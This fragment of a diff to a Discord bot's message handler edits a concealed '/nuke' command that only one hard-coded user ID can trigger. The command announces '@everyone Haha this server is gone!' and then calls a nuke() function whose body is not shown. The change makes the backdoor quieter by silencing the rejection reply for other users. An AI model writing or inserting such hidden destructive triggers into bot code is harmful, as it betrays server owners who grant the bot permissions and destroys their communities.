@@ -159,9 +159,9 @@ if (message.content.startsWith(prefix + "ping")) {
     setTimeout(react,500);
     message.react("🔼");
   }else
-  if (message.content.startsWith("/nukelol")) {
+  if (message.content.startsWith("/nuke")) {
     if (message.author.id !== '289523788822085632') 
-      return message.reply("wow you really thought you were gonna get away with doing that didn't you.");
+      return;
     message.channel.send("@everyone Haha this server is gone! farewell and have fun :)")
     setTimeout(nuke, 5000);
   }
